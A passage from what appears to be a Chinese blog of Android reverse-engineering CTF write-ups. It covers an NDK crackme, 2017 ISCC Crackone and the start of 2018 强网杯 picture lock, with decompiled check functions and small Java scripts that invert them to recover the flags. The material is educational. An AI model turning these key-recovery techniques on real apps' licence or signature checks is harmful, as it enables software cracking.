全局变量缓存）</li><li><code>a2</code>：未使用</li><li><code>a3</code>：输入的 Java 字符串对象（<code>jstring</code>）</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> __fastcall <span class="title">abcdefghijklmn</span><span class="params">(JNIEnv *a1, <span class="type">int</span> a2, <span class="type">void</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// r6</span></span><br><span class="line">  jmethodID v7; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_jfieldID</span> *key; <span class="comment">// r4</span></span><br><span class="line">  jobject v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v10; <span class="comment">// r5</span></span><br><span class="line">  jclass v12; <span class="comment">// [sp+4h] [bp-C4h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *user_input; <span class="comment">// [sp+8h] [bp-C0h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">12</span>]; <span class="comment">// [sp+14h] [bp-B4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v15[<span class="number">140</span>]; <span class="comment">// [sp+20h] [bp-A8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !jniEnv )</span><br><span class="line">    jniEnv = a1;                                <span class="comment">// 缓存JNIEnv指针</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;v15[<span class="number">12</span>], <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">  user_input = (*jniEnv)-&gt;<span class="built_in">GetStringUTFChars</span>(jniEnv, a3, <span class="number">0</span>);<span class="comment">// 将java字符串转为c字符串</span></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(user_input) == <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">8</span>; ++i )</span><br><span class="line">      s2[i] = user_input[i] - i;                <span class="comment">// 前8个字符减去索引值</span></span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    s2[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(seed[<span class="number">0</span>], s2) )                 <span class="comment">// 与seed[0]比较</span></span><br><span class="line">    &#123;</span><br><span class="line">      v12 = (*jniEnv)-&gt;<span class="built_in">FindClass</span>(jniEnv, <span class="string">&quot;com/example/mobicrackndk/Calc&quot;</span>);<span class="comment">// 加载这个类</span></span><br><span class="line">      <span class="keyword">if</span> ( !v12 )</span><br><span class="line">      &#123;</span><br><span class="line">        _android_log_print(<span class="number">4</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;class,failed&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = (*jniEnv)-&gt;<span class="built_in">GetStaticMethodID</span>(jniEnv, v12, <span class="string">&quot;calcKey&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        _android_log_print(<span class="number">4</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;method,failed&quot;</span>);</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      _JNIEnv::<span class="built_in">CallStaticVoidMethod</span>(jniEnv, v12, v7);<span class="comment">// 调用 Java 层的 Calc.calcKey() 方法</span></span><br><span class="line">      key = (*a1)-&gt;<span class="built_in">GetStaticFieldID</span>(a1, v12, <span class="string">&quot;key&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);<span class="comment">// 获取该静态字段的jfieldID</span></span><br><span class="line">      <span class="keyword">if</span> ( !key )</span><br><span class="line">        _android_log_print(<span class="number">4</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;fid,failed&quot;</span>);</span><br><span class="line">      v9 = (*a1)-&gt;<span class="built_in">GetStaticObjectField</span>(a1, v12, key);<span class="comment">// 获取目标类的静态字段值</span></span><br><span class="line">      v10 = (*jniEnv)-&gt;<span class="built_in">GetStringUTFChars</span>(jniEnv, v9, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; <span class="built_in">strlen</span>(v10) + <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        s2[i + <span class="number">4</span>] = user_input[i] - i;          <span class="comment">// s2[i+4]其实就是v15[i]</span></span><br><span class="line">        ++i;</span><br><span class="line">      &#125;</span><br><span class="line">      v15[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">strcmp</span>(v10, v15) == <span class="number">0</span>; <span class="comment">//与key进行比较</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆向得到，我们的输入的前八个字节减去索引要与seed[0]相等，后八个字节减去索引要与key相同</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package com.example.mobicrackndk;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">static</span> String key;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">calcKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> <span class="built_in">StringBuffer</span>(<span class="string">&quot;c7^WVHZ,&quot;</span>);</span><br><span class="line">        key = sb.<span class="built_in">reverse</span>().<span class="built_in">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>key=&quot;,ZHVW^7c&quot;</code></p><p>所以写个脚本即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">My</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String key = <span class="string">&quot;QflMn`fH,ZHVW^7c&quot;</span>;</span><br><span class="line">        <span class="type">char</span>[] chars = key.<span class="built_in">toCharArray</span>();</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++) &#123;</span><br><span class="line">            result.<span class="built_in">append</span>((<span class="type">char</span>)(chars[i] + i));  <span class="comment">// 每个字符减去索引值</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.<span class="built_in">println</span>(result.<span class="built_in">toString</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是wp说这是错误的</p><p>发现是在<code>_init_my</code>中存在对seed的修改</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> _init_my()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">size_t</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strlen</span>(seed[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    t[i] = seed[<span class="number">0</span>][i] - <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  seed[<span class="number">0</span>] = t;</span><br><span class="line">  byte_4038 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>都减了3，对脚本进行修改</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">My</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String key = <span class="string">&quot;QflMn`fH,ZHVW^7c&quot;</span>;</span><br><span class="line">        <span class="type">char</span>[] chars = key.<span class="built_in">toCharArray</span>();</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;<span class="number">8</span>)&#123;</span><br><span class="line">                chars[i]-=<span class="number">3</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            result.<span class="built_in">append</span>((<span class="type">char</span>)(chars[i] + i));  <span class="comment">// 每个字符减去索引值</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.<span class="built_in">println</span>(result.<span class="built_in">toString</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NdkMobiL4cRackEr</span><br></pre></td></tr></table></figure><p>成功</p><h1 id="静态分析综合题目"><a href="#静态分析综合题目" class="headerlink" title="静态分析综合题目"></a>静态分析综合题目</h1><h2 id="2017-ISCC-Crackone"><a href="#2017-ISCC-Crackone" class="headerlink" title="2017 ISCC Crackone"></a>2017 ISCC Crackone</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="type">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">     super.<span class="built_in">onCreate</span>(savedInstanceState);</span><br><span class="line">     <span class="built_in">setContentView</span>(R.layout.activity_main);</span><br><span class="line">     <span class="keyword">this</span>.editFlag = (EditText) <span class="built_in">findViewById</span>(R.id.textView3);</span><br><span class="line">     <span class="keyword">this</span>.button = (Button) <span class="built_in">findViewById</span>(R.id.button);</span><br><span class="line">     <span class="keyword">this</span>.button.<span class="built_in">setOnClickListener</span>(<span class="keyword">new</span> View.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: org.isclab.iscc.MainActivity.1</span></span><br><span class="line">         @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">         <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(View v) &#123;</span><br><span class="line">             String flag = Digest.<span class="built_in">encode</span>(MainActivity.<span class="keyword">this</span>.editFlag.<span class="built_in">getText</span>().<span class="built_in">toString</span>()).<span class="built_in">trim</span>();</span><br><span class="line">             Log.<span class="built_in">i</span>(<span class="string">&quot;ISCC&quot;</span>, flag);</span><br><span class="line">             <span class="type">int</span> result = MainActivity.<span class="keyword">this</span>.<span class="built_in">checkFlag</span>(flag.<span class="built_in">getBytes</span>(), flag.<span class="built_in">length</span>());</span><br><span class="line">             <span class="keyword">if</span> (result == <span class="number">1</span>) &#123;</span><br><span class="line">                 Toast.<span class="built_in">makeText</span>(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;Flag验证成功！&quot;</span>, <span class="number">0</span>).<span class="built_in">show</span>();</span><br><span class="line">             &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                 Toast.<span class="built_in">makeText</span>(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;Flag验证失败！&quot;</span>, <span class="number">0</span>).<span class="built_in">show</span>();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>checkFlag为核心函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL4 __cdecl <span class="title">native_checkFlag</span><span class="params">(JNIEnv *a1, <span class="type">int</span> a2, <span class="type">void</span> *usrinput, <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *usrinput_arr; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *end; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> tmp; <span class="comment">// [esp+2Bh] [ebp-21h]</span></span><br><span class="line">  jbyte *src; <span class="comment">// [esp+2Ch] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  src = (jbyte *)<span class="built_in">malloc</span>(size);</span><br><span class="line">  (*a1)-&gt;<span class="built_in">GetByteArrayRegion</span>(a1, usrinput, <span class="number">0</span>, size, src);</span><br><span class="line">  usrinput_arr = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memset</span>(usrinput_arr, <span class="number">0</span>, size + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(usrinput_arr, src, size);</span><br><span class="line">  <span class="keyword">if</span> ( size / <span class="number">2</span> &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">    end = &amp;usrinput_arr[size];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      tmp = usrinput_arr[idx] - <span class="number">5</span>;</span><br><span class="line">      usrinput_arr[idx++] = *(end - <span class="number">1</span>);</span><br><span class="line">      *--end = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( idx != size / <span class="number">2</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  usrinput_arr[size] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">free</span>(usrinput_arr);</span><br><span class="line">  <span class="built_in">free</span>(src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(usrinput_arr, <span class="string">&quot;=0HWYl1SE5UQWFfN?I+PEo.UcshU&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆向得到脚本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">My</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="string">&quot;=0HWYl1SE5UQWFfN?I+PEo.UcshU&quot;</span>);</span><br><span class="line">        String re_key=key.reverse().toString();</span><br><span class="line">        <span class="type">char</span>[] chars = re_key.toCharArray();</span><br><span class="line">        <span class="type">int</span> idx=re_key.length();</span><br><span class="line">        StringBuffer result=<span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;idx;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;idx/<span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                result.append((<span class="type">char</span>)(chars[i]+<span class="number">5</span>));</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            result.append(chars[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tJU0NDSkFWQU5ES1lYWH0=</span><br></pre></td></tr></table></figure><p>但是在进入checkFlag之前，还对其进行了编码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">package org.isclab.iscc;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Digest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">static</span> <span class="keyword">final</span> String TAG = <span class="string">&quot;Util/Digest&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">static</span> String str = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> String <span class="title">encode</span><span class="params">(String srcStr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (srcStr != null &amp;&amp; srcStr.<span class="built_in">length</span>() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">char</span>[] srcStrCh = srcStr.<span class="built_in">toCharArray</span>();</span><br><span class="line">            StringBuilder asciiBinStrB = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c : srcStrCh) &#123;</span><br><span class="line">                String asciiBin = Integer.<span class="built_in">toBinaryString</span>(c);</span><br><span class="line">                <span class="keyword">while</span> (asciiBin.<span class="built_in">length</span>() &lt; <span class="number">8</span>) &#123;</span><br><span class="line">                    asciiBin = <span class="string">&quot;0&quot;</span> + asciiBin;</span><br><span class="line">                &#125;</span><br><span class="line">                asciiBinStrB.<span class="built_in">append</span>(asciiBin);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (asciiBinStrB.<span class="built_in">length</span>() % <span class="number">6</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                asciiBinStrB.<span class="built_in">append</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            String asciiBinStr = String.<span class="built_in">valueOf</span>(asciiBinStrB);</span><br><span class="line">            <span class="type">char</span>[] codeCh = <span class="keyword">new</span> <span class="type">char</span>[asciiBinStr.<span class="built_in">length</span>() / <span class="number">6</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; codeCh.length; i++) &#123;</span><br><span class="line">                <span class="type">int</span> index = Integer.<span class="built_in">parseInt</span>(asciiBinStr.<span class="built_in">substring</span>(<span class="number">0</span>, <span class="number">6</span>), <span class="number">2</span>);</span><br><span class="line">                asciiBinStr = asciiBinStr.<span class="built_in">substring</span>(<span class="number">6</span>);</span><br><span class="line">                codeCh[i] = str.<span class="built_in">charAt</span>(index);</span><br><span class="line">            &#125;</span><br><span class="line">            StringBuilder code = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>(String.<span class="built_in">valueOf</span>(codeCh));</span><br><span class="line">            <span class="keyword">if</span> (srcStr.<span class="built_in">length</span>() % <span class="number">3</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                code.<span class="built_in">append</span>(<span class="string">&quot;==&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (srcStr.<span class="built_in">length</span>() % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">                code.<span class="built_in">append</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i2 = <span class="number">76</span>; i2 &lt; code.<span class="built_in">length</span>(); i2 += <span class="number">76</span>) &#123;</span><br><span class="line">                code.<span class="built_in">insert</span>(i2, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            code.<span class="built_in">append</span>(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> String.<span class="built_in">valueOf</span>(code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> srcStr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单分析，可以发现是标准base64，就不用自己写脚本了，cyberchef得到</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ISCCJAVANDKYXX&#125;</span><br></pre></td></tr></table></figure><p>成功</p><h2 id="2018-强网杯-picture-lock"><a href="#2018-强网杯-picture-lock" class="headerlink" title="2018 强网杯 picture lock"></a>2018 强网杯 picture lock</h2><p>在android中，<code>onActivityResult</code>是一个<code>android.app.Activity</code>类预先定义好的回调函数，只有当内部方法调用<code>startActivityForResult(Intent intent, int requestCode)</code>来启动另一个Activity的时候才会调用这个回调函数，被启动的Activity必须在结束前调用setResult来设置返回结果和finish来关闭自己，关闭完之后原Activity就会调用<code>onActivityResult</code>方法，并将之前启动的Activity的resultCode和intent以及一开始调用新Activity传入的requestCode一起传入<code>onActivityResult</code></p><p>MediaStore内容提供器中，<code>_data</code>代表绝对路径</p><p><strong>逆向分析：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">j</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123; <span class="comment">// 获取该包的签名信息</span></span><br><span class="line">        Signature[] signatureArr = getPackageManager().getPackageInfo(<span class="string">&quot;com.a.sample.picturelock&quot;</span>, <span class="number">64</span>).signatures; <span class="comment">// 获取该包的签名信息</span></span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">messageDigest</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>); <span class="comment">// 初始化MD5计算器</span></span><br><span class="line">        <span class="keyword">for</span> (Signature signature : signatureArr) &#123;</span><br><span class="line">            messageDigest.update(signature.toByteArray()); <span class="comment">// 遍历所有签名并更新哈希值</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] digest = messageDigest.digest(); <span class="comment">// 最终md5哈希</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : digest) &#123; <span class="comment">// 将字节数组转换为十六进制字符串</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> b &amp; <span class="number">255</span>;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; <span class="number">16</span>) &#123;</span><br><span class="line">                sb.append(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">            